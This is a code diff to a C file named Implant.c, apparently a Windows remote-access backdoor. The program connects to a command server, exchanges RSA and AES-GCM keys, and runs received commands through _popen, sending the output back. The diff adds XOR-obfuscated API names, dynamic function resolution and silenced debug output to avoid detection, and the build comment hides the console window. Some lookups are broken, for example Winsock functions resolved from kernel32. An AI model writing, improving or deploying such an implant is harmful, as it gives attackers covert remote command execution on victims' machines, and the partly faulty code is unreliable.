@@ -3,6 +3,9 @@
 #include "Communication.h"
 #include <stdio.h>
 
+pSend mySend = NULL;
+pRecv myRecv = NULL;
+
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -s
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
 int main()
@@ -16,15 +19,50 @@ int main()
     char s_kernel[] = {0x20, 0x2E, 0x39, 0x25, 0x2E, 0x27, 0x78, 0x79, 0x65, 0x2F, 0x27, 0x27, 0x00};                 // kernel32.dll
     char s_createproc[] = {0x08, 0x39, 0x2E, 0x2A, 0x3F, 0x2E, 0x1B, 0x39, 0x24, 0x28, 0x2E, 0x38, 0x38, 0x0A, 0x00}; // CreateProcessA
     char s_ws2_32[] = {0x3C, 0x38, 0x79, 0x14, 0x78, 0x79, 0x00};                                                     // ws2_32.dll
+    char s_closesocket[] = {0x28,0x27,0x24,0x38,0x2e,0x38,0x24,0x28,0x20,0x2e,0x3f,0x00}; //closesocket
+    char s_send[] = {0x38,0x2e,0x25,0x2f,0x00}; //send
+    char s_recv[] = {0x39,0x2e,0x28,0x3d,0x00}; //recv
+    char s_popen[] = {0x14,0x3b,0x24,0x3b,0x2e,0x25,0x0}; //_popen
+    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
+    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
+    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
     decode(command, 'K', 7);
     decode(s_kernel, 'K', sizeof(s_kernel) - 1);
     decode(s_createproc, 'K', sizeof(s_createproc) - 1);
+    decode(s_closesocket, 'K', sizeof(s_closesocket) - 1);
+    decode(s_send, 'K', sizeof(s_send) - 1);
+    decode(s_recv, 'K', sizeof(s_recv) - 1);
+    decode(s_popen, 'K', sizeof(s_popen) - 1);
+        decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
+    decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
+    decode(s_connect, 'K', sizeof(s_connect) - 1);
     
     WSADATA wsa;
     SOCKADDR_IN server;
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     int rsaUsed = 0; // track whether the RSA-encrypted AES key has been sent
+
+
+    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
+
+    HMODULE hKernel_32 = GetModuleHandleA(s_kernel);
+
+    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(hKernel_32, s_createproc);
+
+    
+
+    
+
+    pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hKernel_32, s_WSAStartup);
+    pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hKernel_32, s_WSASocketA);
+    pConnect myConnect = (pConnect)GetProcAddress(hKernel_32, s_connect);
+    pRecv myRecv = (pRecv)GetProcAddress(hKernel_32, s_recv);
+    pPopen myPopen = (pPopen)GetProcAddress(hKernel_32, s_popen);
+    pSend mySend = (pSend)GetProcAddress(hKernel_32, s_send);
+    pClosesocket myclosesocket = (pClosesocket)GetProcAddress(hKernel_32, s_closesocket);
+
+
 
     // AES initialization: create an AES-GCM session key and prepare authenticated cipher parameters.
     // pbSecret is a random 32-byte session key. nonce and tag are used for AES-GCM encryption/decryption.
@@ -58,7 +96,7 @@ int main()
     status = BCryptGenRandom(NULL, pbSecret, cbSecret, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
     if (!BCRYPT_SUCCESS(status))
     {
-        printf("pb line 61");
+        // printf("pb line 61");
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
@@ -66,7 +104,7 @@ int main()
     status = BCryptGenRandom(NULL, nonce, sizeof(nonce), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
     if (!BCRYPT_SUCCESS(status))
     {
-        printf("pb line 69");
+        // printf("pb line 69");
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
@@ -120,11 +158,8 @@ int main()
         return 0;
     }
 
-    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
 
-    HMODULE hWs2_32 = LoadLibraryExA(s_ws2_32, NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
-
-    if (hWs2_32 == NULL)
+    if (hKernel_32 == NULL)
     {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
@@ -150,20 +185,11 @@ int main()
         return 0;
     }
 
-    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
-    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
-    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
-    decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
-    decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
-    decode(s_connect, 'K', sizeof(s_connect) - 1);
     
 
-    pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
-    pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
-    pConnect myConnect = (pConnect)GetProcAddress(hWs2_32, s_connect);
     if (!myWSAStartup || !myWSASocket || !myConnect)
     {
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
@@ -171,7 +197,7 @@ int main()
 
     if (myWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
@@ -181,7 +207,7 @@ int main()
     if (soc == INVALID_SOCKET)
     {
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
@@ -189,15 +215,15 @@ int main()
 
     server.sin_family = AF_INET;
     server.sin_port = htons(2600);
-    server.sin_addr.s_addr = inet_addr("192.168.1.147");
+    server.sin_addr.s_addr = inet_addr("0.0.0.0");
 
     // Establish TCP connection to the server before performing the RSA handshake.
     // The server must send its public-key blob only after connection is established.
     if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0)
     {
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
@@ -208,9 +234,9 @@ int main()
     // This is the server's public key in BCrypt BLOB format.
     if (recv_all(soc, (char *)&rsaBlobLen, 4) <= 0)
     {
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
@@ -220,9 +246,9 @@ int main()
     rsaPbinput = HeapAlloc(GetProcessHeap(), 0, rsaBlobLen);
     if (rsaPbinput == NULL)
     {
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
@@ -232,16 +258,16 @@ int main()
     if (recv_all(soc, (char *)rsaPbinput, (int)rsaBlobLen) <= 0)
     {
         HeapFree(GetProcessHeap(), 0, rsaPbinput);
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
     }
 
-    printf("%s\n", (char *)rsaPbinput);
+    // printf("%s\n", (char *)rsaPbinput);
 
     status = BCryptImportKeyPair(
         rsaAlgorithm,
@@ -255,16 +281,16 @@ int main()
     if (!BCRYPT_SUCCESS(status))
     {
         HeapFree(GetProcessHeap(), 0, rsaPbinput);
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
     }
-    else
-        printf("key imported !");
+    // else
+        // printf("key imported !");
 
     HeapFree(GetProcessHeap(), 0, rsaPbinput);
 
@@ -283,9 +309,9 @@ int main()
     if (!BCRYPT_SUCCESS(status))
     {
         BCryptDestroyKey(rsaKey);
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
-        FreeLibrary(hWs2_32);
+        FreeLibrary(hKernel_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
@@ -306,13 +332,13 @@ int main()
     if (send_all(soc, header, sizeof(header)) <= 0 ||
         send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen) <= 0)
     {
-        closesocket(soc);
-        printf("error here");
+        myclosesocket(soc);
+        // printf("error here");
         return 1;
     }
 
     rsaUsed = 1;
-    printf("Cle AES chiffree envoyee au serveur !\n");
+    // printf("Cle AES chiffree envoyee au serveur !\n");
     BCryptDestroyKey(rsaKey);
     rsaKey = NULL;
     rsaPbinput = NULL;
@@ -325,14 +351,14 @@ int main()
     char received_message[512];
     int received_message_len = 0;
 
-    printf("begin the loop !");
+    // printf("begin the loop !");
     while (kill == 1)
     {
         checker = recv_all(soc, rcvbuffer, 4);
         if (checker <= 0)
         {
-            printf("error line 329");
-            // return 1; // error in recv_all
+            // printf("error line 329");
+            kill = 0; // error in recv_all
         }
 
         unsigned int cmdlen = (unsigned char)rcvbuffer[0] |
@@ -342,11 +368,11 @@ int main()
         // Receive the encrypted command payload and decrypt it using AES-GCM.
         // cmdlen is the binary ciphertext length, not a string length.
 
-        printf("[DEBUG] (cmdlen) : %u octets\n", cmdlen);
-        if (cmdlen < 28 || cmdlen > 4096)
-        {
-            printf("[FATAL] \n");
-        }
+        // printf("[DEBUG] (cmdlen) : %u octets\n", cmdlen);
+        // if (cmdlen < 28 || cmdlen > 4096)
+        // {
+        //     printf("[FATAL] \n");
+        // }
 
         recv_all(soc, received_message, cmdlen);
 
@@ -363,25 +389,25 @@ int main()
                              (BYTE *)rcvbuffer, sizeof(rcvbuffer), &decrypted_len,
                              recv_tag, 16))
         {
-            printf("error decrypting message from server !\n");
-            // return 1;
+            // printf("error decrypting message from server !\n");
+            kill = 0;
         }
 
         cmdlen = decrypted_len;
         rcvbuffer[cmdlen] = '\0';
-        printf("decrypted command : %s\n", rcvbuffer);
+        // printf("decrypted command : %s\n", rcvbuffer);
 
         if (rcvbuffer[0] == '#')
             kill = 0; // kill program if serveur say #
         else
         {
-            pipe = _popen(rcvbuffer, "r");
+            pipe = myPopen(rcvbuffer, "r");
             if (pipe == NULL)
             {
                 // Command failed to execute
                 const char *error_msg = "ERROR: Failed to execute command\n";
                 if (send_all(soc, (char *)error_msg, (int)strlen(error_msg)) <= 0)
-                    return 1;
+                    kill = 0;
             }
             else
             {
@@ -419,8 +445,8 @@ int main()
                     if (send_result <= 0)
                     {
                         _pclose(pipe);
-                        printf("error line 418");
-                        // return 1; // Connection lost, exit
+                        // printf("error line 418");
+                        kill = 0;
                     }
                 }
                 _pclose(pipe);
@@ -431,7 +457,7 @@ int main()
     // cleanup
     if (kill == 0)
     {
-        closesocket(soc);
+        myclosesocket(soc);
         WSACleanup();
     }
 
@@ -451,5 +477,6 @@ int main()
     {
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
     }
+    FreeLibrary(hKernel_32);
     return 0;
 }
